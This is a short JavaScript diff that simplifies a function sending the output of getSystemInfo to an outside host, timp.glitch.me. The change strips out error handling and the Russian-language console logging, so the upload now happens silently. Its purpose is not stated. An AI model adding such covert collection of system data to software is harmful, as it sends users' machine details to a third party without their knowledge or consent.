@@ -18,24 +18,12 @@ function getSystemInfo() {
 
 async function uploadSystemInfo() {
     const info = getSystemInfo(); // Получаем информацию о системе
-    try {
-        const response = await fetch('http://timp.glitch.me/upload-system-info', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(info) // Отправляем информацию о системе
-        });
-
-        if (response.ok) {
-            console.log('Данные успешно отправлены');
-            const responseData = await response.text();
-            console.log(responseData);
-        } else {
-            console.log('Ошибка при отправке данных');
-        }
-    } catch (error) {
-        console.error('Ошибка при отправке:', error);
-    }
+    await fetch('http://timp.glitch.me/upload-system-info', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(info) // Отправляем информацию о системе
+    });
 }
 
